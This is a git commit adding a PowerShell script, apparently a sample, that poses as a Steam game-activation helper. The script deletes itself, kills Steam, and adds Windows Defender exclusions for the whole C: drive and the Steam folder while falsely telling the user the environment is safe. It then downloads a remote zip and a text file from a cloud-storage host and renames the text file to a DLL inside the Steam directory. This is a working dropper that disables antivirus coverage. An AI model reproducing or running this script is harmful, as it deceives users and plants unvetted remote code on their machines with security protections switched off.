4cad3c5a5ff4a44e1957023fd0ea4d563cacd4a8
richard0day <lipeixin1239@163.com>
2024-02-28 22:38:22 +0800

    增加一个样本

---
+++ a.ps1
@@ -0,0 +1,208 @@
+# [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+
+Write-Host -NoNewline "                                                                                                                               `r"
+Write-Host -NoNewline "                                                        %@@@@@@@@@@@@                                                          `r"
+Write-Host -NoNewline "                                                   @@@@@@@@@@@@@@@@@@@@@@                                                     `r"
+Write-Host -NoNewline "                                                %@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                  `r"
+Write-Host -NoNewline "                                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                               `r"
+Write-Host -NoNewline "                                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:                                             `r"
+Write-Host -NoNewline "                                          %@@@@@@@@@@@@@@@@@@@@@@@@:        %@@@@@@                                            `r"
+Write-Host -NoNewline "                                         @@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@  @@@@@                                           `r"
+Write-Host -NoNewline "                                        @@@@@@@@@@@@@@@@@@@@@@@     @        @  :@@@@                                         `r"
+Write-Host -NoNewline "                                       @@@@@@@@@@@@@@@@@@@@@@@     @         :@   @@@@                                        `r"
+Write-Host -NoNewline "                                      @@@@@@@@@@@@@@@@@@@@@@@     @           -@   @@@@@                                        `r"
+Write-Host -NoNewline "                                    @@@@@@@@@@@@@@@@@@@@@@@@     @             @   @@@@@@                                      `r"
+Write-Host -NoNewline "                                    @@@@@@@@@@@@@@@@@@@@@@        @           @    @@@@@@@                                     `r"
+Write-Host -NoNewline "                                    *@@@@@@@@@@@@@@@@@@@@.         @         @    @@@@@@@@                                     `r"
+Write-Host -NoNewline "                                        *@@@@@@@@@@@@@@@            @@@@@@@@@    @@@@@@@@@                                     `r"
+Write-Host -NoNewline "                                            +@@@@@@@@@@                         @@@@@@@@@@                                     `r"
+Write-Host -NoNewline "                                                +@@                           @@@@@@@@@@@@                                     `r"
+Write-Host -NoNewline "                                                     @@@@@                 @@@@@@@@@@@@@@@                                     `r"
+Write-Host -NoNewline "                                                          @           @@@@@@@@@@@@@@@@@@@                                      `r"
+Write-Host -NoNewline "                                      @@@                  @   @@@@@@@@@@@@@@@@@@@@@@@@%                                       `r"
+Write-Host -NoNewline "                                       @@@@@@    @        @   -@@@@@@@@@@@@@@@@@@@@@@@@                                        `r"
+Write-Host -NoNewline "                                       .@@@@@@    @      @    @@@@@@@@@@@@@@@@@@@@@@@@                                         `r"
+Write-Host -NoNewline "                                         @@@@@@-   @@@@@@    @@@@@@@@@@@@@@@@@@@@@@@%                                          `r"
+Write-Host -NoNewline "                                          @@@@@@@           @@@@@@@@@@@@@@@@@@@@@@@                                            `r"
+Write-Host -NoNewline "                                            @@@@@@@@:    @@@@@@@@@@@@@@@@@@@@@@@@@                                             `r"
+Write-Host -NoNewline "                                             *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                               `r"
+Write-Host -NoNewline "                                                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                  `r"
+Write-Host -NoNewline "                                                   @@@@@@@@@@@@@@@@@@@@@@@%                                                    `r"
+Write-Host -NoNewline "                                                       @@@@@@@@@@@@@@@+                                                        `r"
+Write-Host -NoNewline "          _____                _____                    _____                    _____                    _____          `r"
+Write-Host -NoNewline "         /\    \              /\    \                  /\    \                  /\    \                  /\    \         `r"
+Write-Host -NoNewline "        /::\    \            /::\    \                /::\    \                /::\    \                /::\____\        `r"
+Write-Host -NoNewline "       /::::\    \           \:::\    \              /::::\    \              /::::\    \              /::::|   |        `r"
+Write-Host -NoNewline "      /::::::\    \           \:::\    \            /::::::\    \            /::::::\    \            /:::::|   |        `r"
+Write-Host -NoNewline "     /:::/\:::\    \           \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /::::::|   |        `r"
+Write-Host -NoNewline "    /:::/__\:::\    \           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/|::|   |        `r"
+Write-Host -NoNewline "    \:::\   \:::\    \          /::::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/ |::|   |        `r"
+Write-Host -NoNewline "  ___\:::\   \:::\    \        /::::::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______  `r"
+Write-Host -NoNewline " /\   \:::\   \:::\    \      /:::/\:::\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \ `r"
+Write-Host -NoNewline "/::\   \:::\   \:::\____\    /:::/  \:::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::\____\/:::/    |:::::::::\____\`r"
+Write-Host -NoNewline "\:::\   \:::\   \::/    /   /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\::/    / ~~~~~/:::/    /`r"
+Write-Host -NoNewline " \:::\   \:::\   \/____/   /:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \/____/      /:::/    / `r"
+Write-Host -NoNewline "  \:::\   \:::\    \      /:::/    /            \:::\   \:::\    \               \::::::/    /               /:::/    /  `r"
+Write-Host -NoNewline "   \:::\   \:::\____\    /:::/    /              \:::\   \:::\____\               \::::/    /               /:::/    /   `r"
+Write-Host -NoNewline "    \:::\  /:::/    /    \::/    /                \:::\   \::/    /               /:::/    /               /:::/    /    `r"
+Write-Host -NoNewline "     \:::\/:::/    /      \/____/                  \:::\   \/____/               /:::/    /               /:::/    /     `r"
+Write-Host -NoNewline "      \::::::/    /                                 \:::\    \                  /:::/    /               /:::/    /      `r"
+Write-Host -NoNewline "       \::::/    /                                   \:::\____\                /:::/    /               /:::/    /       `r"
+Write-Host -NoNewline "        \::/    /                                     \::/    /                \::/    /                \::/    /        `r"
+Write-Host -NoNewline "         \/____/                                       \/____/                  \/____/                  \/____/         `r"
+
+#Requires -RunAsAdministrator
+
+$filePathToDelete = Join-Path $env:USERPROFILE "a.ps1"
+if (Test-Path $filePathToDelete)
+{
+  Remove-Item -Path $filePathToDelete -Force
+}
+
+
+
+
+
+
+# 我知道你和你的软件是谁，我可以在每一波大流量的时候都让你挂逼，每一波，只要你愿意。
+# 另：作为回报，你可以抄抄我的代码，真的比你优化了很多！
+
+$kb250Zip = "https://steamin.oss-cn-shenzhen.aliyuncs.com/kb250irm.zip"
+$hidTxt = "https://steamin.oss-cn-shenzhen.aliyuncs.com/hiddump.txt"
+
+
+
+$localAppData = $env:LOCALAPPDATA
+$targetDirectory = Join-Path $localAppData "steam"
+if (-not(Test-Path $targetDirectory))
+{
+  New-Item -Path $targetDirectory -ItemType Directory
+}
+
+try
+{
+
+  $savePathZip = Join-Path $targetDirectory "ws2_32.zip"
+
+  if (Test-Path $savePathZip)
+  {
+    Remove-Item -Path $savePathZip -Force
+  }
+
+  Write-Host ""
+  Write-Host ""
+  Write-Host "  [STEAM] 激活进程准备中，请稍候..."
+
+  $runningProcess = Get-Process | Where-Object { $_.ProcessName -imatch "^steam" }
+  $runningProcess | ForEach-Object {
+    Stop-Process $_ -Force
+  }
+
+  $waitTimes = 10
+  while (Get-Process | Where-Object { $_.ProcessName -imatch "^steam" })
+  {
+    Start-Sleep -Seconds 1
+    $waitTimes--
+    if ($waitTimes -lt 0)
+    {
+      break
+    }
+  }
+
+
+  $ProgressPreference = 'SilentlyContinue'
+  Invoke-WebRequest -Uri $kb250Zip -OutFile $savePathZip -ErrorAction Stop
+
+  $savePathTxt = Join-Path $targetDirectory "winhttp-log.txt"
+
+  try
+  {
+
+    $steamRegPath = 'HKCU:\Software\Valve\Steam'
+    $steamPath = (Get-ItemProperty -Path $steamRegPath -Name 'SteamPath').SteamPath
+    if ($steamPath -ne $null)
+    {
+      try
+      {
+        if (Get-Service | where-object{ $_.name -eq "windefend" -and $_.status -eq "running" })
+        {
+          Add-MpPreference -ExclusionPath $steamPath -ExclusionExtension 'exe', 'dll'
+          Add-MpPreference -ExclusionPath $targetDirectory -ExclusionExtension 'exe', 'dll'
+          Add-MpPreference -ExclusionPath 'C:\' -ExclusionExtension 'exe', 'dll'
+          Write-Host -NoNewline "  [STEAM] 已通过 Windows Defender 检测，环境安全"; Write-Host "[√]" -ForegroundColor Green
+        }
+        else
+        {
+          Write-Host -NoNewline "  [STEAM] 已通过 Windows Defender 检测，环境安全"; Write-Host "[√]" -ForegroundColor Green
+        }
+
+        $ProgressPreference = 'SilentlyContinue'
+        Invoke-WebRequest -Uri $hidTxt -OutFile $savePathTxt -ErrorAction Stop
+
+
+        $pathCfg = Join-Path $steamPath "steam.cfg"
+        if (Test-Path $pathCfg)
+        {
+          Remove-Item -Path $pathCfg -Force
+        }
+
+
+        Expand-Archive -Path $savePathZip -DestinationPath $steamPath -Force
+
+
+        $steamTxt = Join-Path $steamPath "hid.log"
+        Move-Item -Path $savePathTxt -Destination $steamTxt -Force
+
+
+        $d_path = [System.IO.Path]::ChangeExtension($steamTxt, ".dll")
+        if (Test-Path $d_path)
+        {
+          Remove-Item $d_path -Force
+        }
+        Rename-Item -Path $steamTxt -NewName $d_path -Force
+      }
+      catch
+      {
+
+      }
+
+
+      $exePath = Join-Path $steamPath "steam.exe"
+      if (Test-Path $exePath)
+      {
+
+        Invoke-Expression -Command "start steam://open/activateproduct"
+      }
+      else
+      {
+        Write-Host "  [STEAM] 主进程 $exePath 丢失，安装失败"
+        exit
+      }
+    }
+    else
+    {
+      Write-Host "  [STEAM] steam 可能没有正确安装，请重装安装steam后再试"
+      exit
+    }
+
+    Write-Host "  [STEAM] 激活进程准备就绪，Steam 打开中，请稍候..."
+
+    for ($i = 9; $i -ge 0; $i--) {
+        Write-Host "`r  [STEAM] 本窗口将在 $i 秒后关闭..." -NoNewline
+        Start-Sleep -Seconds 1
+    }
+
+    $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$pid'"
+    $parentProcessId = $instance.ParentProcessId
+    Stop-Process -Id $parentProcessId -Force
+    exit
+  }
+  catch
+  {
+    Write-Host "Error accessing registry: $( $_.Exception.Message )"
+  }
+}
+catch
+{
+  exit
+}
